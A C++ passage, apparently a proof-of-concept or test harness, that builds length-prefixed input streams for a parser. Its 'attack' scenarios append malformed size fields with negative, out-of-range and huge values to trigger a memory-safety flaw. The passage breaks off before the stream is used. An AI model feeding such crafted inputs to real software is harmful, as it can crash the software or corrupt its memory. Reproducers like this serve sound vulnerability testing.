static std::unique_ptr<char[]> makeStream( const std::string& payload, size_t& size )
{
    size = payload.size() + 4;
    std::unique_ptr<char[]> buf( new char[size] );
    uint32_t len = (uint32_t) payload.size();
    buf[0] = (char) ( len & 0xff );
    buf[1] = (char) ( ( len >> 8 ) & 0xff );
    buf[2] = (char) ( ( len >> 16 ) & 0xff );
    buf[3] = (char) ( ( len >> 24 ) & 0xff );
    std::memcpy( buf.get() + 4, payload.data(), payload.size() );
    return buf;
}

int main( int argc, char** argv )
{
    setvbuf( stdout, nullptr, _IONBF, 0 );
    const char* scenario = argc > 1 ? argv[1] : "baseline";
    std::string payload = std::string( "|HEADER=" ) + HEADER_TEXT + "|SIZE1=10";

    if( std::strcmp( scenario, "attackz" ) == 0 )
        payload += "|SIZEZ=84215045";
    else if( std::strcmp( scenario, "attackneg" ) == 0 )
        payload += "|SIZE-1=84215045";
    else if( std::strcmp( scenario, "attackfar" ) == 0 )
        payload += "|SIZE+1=10|SIZE-1=84215045";
    else if( std::strcmp( scenario, "baseline" ) != 0 )
    {
        std::fprintf( stderr, "usage: %s baseline|attackz|attackneg|attackfar\n", argv[0] );
        return 2;
    }
    payload.push_back( '|' );
    payload.push_back( '\0' );

    size_t size = 0;
    std::unique_ptr<char[]> bytes = makeStream( payload, size );
